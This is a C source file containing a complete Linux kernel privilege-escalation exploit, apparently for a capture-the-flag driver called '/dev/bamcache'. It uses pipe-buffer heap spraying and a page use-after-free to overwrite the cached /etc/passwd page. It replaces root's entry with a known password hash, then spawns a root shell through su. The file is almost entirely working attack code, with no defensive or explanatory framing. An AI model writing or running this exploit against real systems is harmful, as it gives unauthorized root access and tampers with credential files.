#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/resource.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>


#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

#define ALLOC 0xcafe01
#define DELETE 0xcafe02
#define EDIT 0xcafe03

typedef struct
{
    int64_t idx;
    uint64_t size;
    char *buf;    
}user_req_t;

int dev_fd;

int open_device()
{
    int fd = open("/dev/bamcache", O_RDWR);
    if(fd==-1){
        perror("[-] open(/dev/bamcache)");
        return EXIT_FAILURE;
    }

    puts("[+] Device opened");

    return fd;
}

int bam_add(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, ALLOC, &req);
    if(ret==-1){
        perror("[-] bamcache: add failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_edit(uint64_t idx, uint64_t size, char *buff)
{
    user_req_t req = {
        .idx = idx,
        .size = size,
        .buf = buff
    };

    int ret = ioctl(dev_fd, EDIT, &req);
    if(ret==-1){
        perror("[-] bamcache: edit failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

int bam_del(uint64_t idx)
{
    user_req_t req = {
        .idx = idx,
    };

    int ret = ioctl(dev_fd, DELETE, &req);
    if(ret==-1){
        perror("[-] bamcache: delete failed");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}

#define PIPE_NUM 173
#define FILE_NUM 0x100

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];
size_t find_pipe[PIPE_NUM][2];
int same_pipe[2];

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

size_t find_page_addr(size_t *data)
{
    for(int idx=0;idx<0xbf0/8;idx++)
    {
        if(data[idx]>0xffff000000000000&&data[idx+1]==0x100000003&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0&&data[idx]!=0xffffffffffffffff)
        {
            return idx;
        }
    }
    return -1;
}

size_t find_normal_pipe(size_t *data,int pwd_page_idx)
{
    for(int idx=0;idx<0xbf0/8;idx++)
    {
        if(data[idx]>0xffff000000000000&&data[idx+1]!=0x100000000&&data[idx+2]>0xffffffff81000000&&data[idx+3]==0x10&&data[idx+4]==0&&data[idx+5]==0&&data[idx+6]==0)
        {
            if(idx-pwd_page_idx>24||pwd_page_idx-idx>24)
                return idx;
        }
    }
    return -1;
}

int main(int argc, char **argv, char **envp)
{
    cpu_set_t cpu_set;

    puts("\033[32m\033[1m[+] bamcache no leak page-uaf.\033[0m");

    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    int target_file_fd;
    target_file_fd = open("/etc/passwd", O_RDONLY);
    char *addr = mmap(NULL,0x1000, PROT_READ, MAP_SHARED, target_file_fd, 0);
    if(addr<=0)
    {
        errExit("mmap error.");
    }
    if (target_file_fd < 0){
		errExit("Failed to open the pwd file");
    }
    long page_size = sysconf(_SC_PAGE_SIZE);

    size_t pipe_magic;
    for(int i=0;i<PIPE_NUM;i++)
    {
        if(pipe(pipe_fd[i])<0)
        {
            errExit("PIPE_ERROR.");
        }
    }

    for(int i=0;i<173;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }
    }

    puts("[*] allocating pipe pages...");
    for (int i = 0; i < PIPE_NUM; i++) {
        size_t magic_num = 0xdead0000+i;
        write(pipe_fd[i][1], &magic_num, 8);
        write(pipe_fd[i][1], "bambamx7", 8);
        // write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], &magic_num, sizeof(int));
        write(pipe_fd[i][1], "bambamx7", 8);
        write(pipe_fd[i][1], "bambamx7", 8);  /* prevent pipe_release() */
    }
    // getchar();

    puts("[*] Create 4 holes in pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i += (PIPE_NUM/4))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    
    puts("[*] Trigger oob");

    char bam_buff[0x1000];

    dev_fd = open_device();
    for(int i = 1; i < 10; i++){
        bam_add(i);
    }

    for(int i = 1; i < 10; i++){
        bam_edit(i, 0x1000, bam_buff);
    }

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if(i%(PIPE_NUM/4)!=0)//can't equal to the hole
        {
            read(pipe_fd[i][0],find_pipe[i],0x10);
        }
        
    }

    size_t victim_id = 0;
    size_t prev_id = 0;
    size_t magic = 0;
    size_t offset_in_file;
    int retval;
    char *tmp_content = malloc(0x1000);
    size_t buf[0x1000];
    size_t pipe_data[0x200];
    int SND_PIPE_BUF_SZ = 96*2;
    size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ/0x28);

    int is_found = 0;
    // puts("[*]finding...");
    for (int i = 0; i < PIPE_NUM&&!is_found; i++)
    {
        if(i%(PIPE_NUM/4)!=0)//can't equal to the hole
        {
            if(find_pipe[i][0]!=0xdead0000+i&&!strncmp(&find_pipe[i][1],"bambamx7",8))
            {
                same_pipe[0]=find_pipe[i][0]-0xdead0000;
                same_pipe[1]=i;//previous
                // if(same_pipe[0]>PIPE_NUM||same_pipe[0]-same_pipe[1]==1||same_pipe[1]-same_pipe[0]==1)
                if(same_pipe[0]>PIPE_NUM)
                {
                    RED puts("[*]pipe idx out of range."); CLOSE
                    return -1;
                }
                BLUE printf("found pipe coincide at idx:%d and %d\n",same_pipe[0],same_pipe[1]); CLOSE
                is_found=1;
            }   
        }
        
    }
    if(!is_found)
    {
        perror("[*] Not found two pipe.");
        for(int i = 1; i < 10; i++){
            bam_del(i);
        }
        close(dev_fd);
        return -1;
    }

    memset(buf, '\0', sizeof(buf));

    /*write something to alarge the pipe_read size after*/
    // write(pipe_fd[same_pipe[1]][1], buf,0x500);
    write(pipe_fd[same_pipe[1]][1], buf, SND_PIPE_BUF_SZ*0x10 - 24 - 3*sizeof(int));


    puts("[*]uaf one of the pipe_buffer");
    // getchar();
    close(pipe_fd[same_pipe[0]][0]);
    close(pipe_fd[same_pipe[0]][1]);

    // puts("[*]press enter to put the pwd file page cache into the uaf page");
    puts("[*] fcntl() to set the pipe_buffer on victim page...");
    // getchar();

    
    for (int i = 0; i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }

        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) < 0) {
            printf("[x] failed to resize %d pipe!\n", i);
            return -1;
        }
    }

    for (int i = 0; i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }

        if (write(pipe_fd[i][1], "7", 1) < 0) {
            printf("[x] failed to write one byte in %d pipe!\n", i);
            return -1;
        }
    }

    //what we want to read pwd->page
    for (int i = 1; i < PIPE_NUM; i+=2) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0) {
            continue;
        }
        offset_in_file = 3;
        retval = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (retval < 0)
        {
            printf("splice failed:%d!\n",i);
            return -1;
        }
		    
	    else if (retval == 0)
        {
            printf("short splice:%d!\n",i);
            return -1;
        }    
    }
    puts("\033[32m\033[1m[+] File splice done.\033[0m");


    puts("[*]Try to read from pipe");

    int read_pipe_size = 0xc00;//SND_PIPE_BUF_SZ*4
    retval = read(pipe_fd[same_pipe[1]][0],pipe_data,read_pipe_size);
    if (retval < 0)
            {
                printf("read failed:!");
                return -1;
            }
            // else if (retval < read_pipe_size)
                // {
                // printf("short read!");
                // return -1;
                // }

    puts("[*]find the pwd->page_addr...");
    int pwd_page_idx = find_page_addr(&pipe_data);
    size_t page_addr = pipe_data[pwd_page_idx];
    if(page_addr<=0)
    {
        printf("[*]pwd->page_addr not found!\n");
        return -1;
    }

    BLUE printf("[*] pwd->page_addr:0x%llx\n",page_addr); CLOSE

    puts("[*]find the normal_pipe_page idx...");
    size_t normal_pipe_page_idx = find_normal_pipe(&pipe_data,pwd_page_idx);
    if(normal_pipe_page_idx<0)
    {
        printf("[*]normal_pipe_page not found!\n");
        return -1;
    }
    BLUE printf("[*] normal_pipe_page_idx:0x%llx\n",normal_pipe_page_idx); CLOSE

    
    //pipe_data[(0xb8)/8] = pipe_data[3];
    //pipe_data[(0xc0)/8] = 0x100000000;
    pipe_data[normal_pipe_page_idx] = page_addr;
    pipe_data[normal_pipe_page_idx+1] = 0x400000000;
    char *tmp = malloc(0x1000);

    memset(tmp,"A",0x10);
    memcpy(tmp+0x10,pipe_data,retval);

    puts("[*]edit the pipe->page to the pwd->page");
    write(pipe_fd[same_pipe[1]][1],tmp,retval);

    char *data = ":$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt evil evil
    printf("Setting root password to \"evil\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd page cache");
    //what we want to edit pipe->page
    for (int i = 1;i < PIPE_NUM; i++) {
        if (i == same_pipe[1] || i == same_pipe[0] || i%(PIPE_NUM/4)==0 || i%0x8==0) {
            continue;
        }
        int retval = write(pipe_fd[i][1], data,data_size);
            if (retval < 0)
            {
                printf("Write failed:%d!",i);
                return -1;
            }
            else if (retval < data_size)
                {
                    printf("short write:%d!",i);
                return -1;
                }
        }
    puts("[*]Now the pwd is:"); CLOSE
    system("cat /etc/passwd");
    char *cmd[] = {"/bin/sh", "-c", "(echo evil; cat) | su - -c \""
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};

    execv("/bin/sh", cmd);
}